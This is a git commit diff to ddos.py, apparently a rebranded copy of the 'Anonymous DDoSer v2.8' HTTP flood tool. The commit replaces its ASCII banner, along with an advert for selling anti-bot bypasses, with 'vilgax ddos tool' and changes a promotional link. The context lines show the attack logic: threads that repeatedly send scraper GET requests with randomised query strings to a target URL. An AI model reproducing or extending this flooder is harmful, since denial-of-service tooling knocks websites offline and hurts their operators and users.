a3dedf3dff7b3a9c112f80f4f115a4ae4bdc2754
lehongphong08 <118195102+lehongphong08@users.noreply.github.com>
2023-02-21 13:36:43 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -184,15 +184,7 @@ def logo():
     else:
         os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Download: bit.ly/AnonyV28 ~ Anonymous DDoSer v2.8")
     print('''
-             - PassDDoS#6595 Selling Bypass JS/UAM/Captcha/etc -
-
-    /\_____/\     88""Yb    db    .dP"Y8 .dP"Y8 8888b.  8888b.   dP"Yb  .dP"Y8
-   /  o   o  \    88__dP   dPYb   `Ybo." `Ybo."  8I  Yb  8I  Yb dP   Yb `Ybo."
-  ( ==  ^  == )   88"""   dP__Yb  o.`Y8b o.`Y8b  8I  dY  8I  dY Yb   dP o.`Y8b
-   )         (    88     dP""""Yb 8bodP' 8bodP' 8888Y"  8888Y"   YbodP  8bodP'
-  (           )   ========================================================
- ( (  )   (  ) )     Anonymous DDoSer v2.8 - Best HTTP Flooder For FREE
-(__(__)___(__)__) ===== Version: [ Private ]''')
+             vilgax ddos tool 
     try:
         print("\n[*] Target : " +str(url_main)+ ":" +str(port))
     except:
@@ -809,7 +801,7 @@ class JSv2(threading.Thread):
                     soso = scraper.get(url, timeout=15)
                 else:
                     soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
-                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] bit.ly/killnetvn | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 #req_code += 1
                 try:
                     for y in range(multiple):
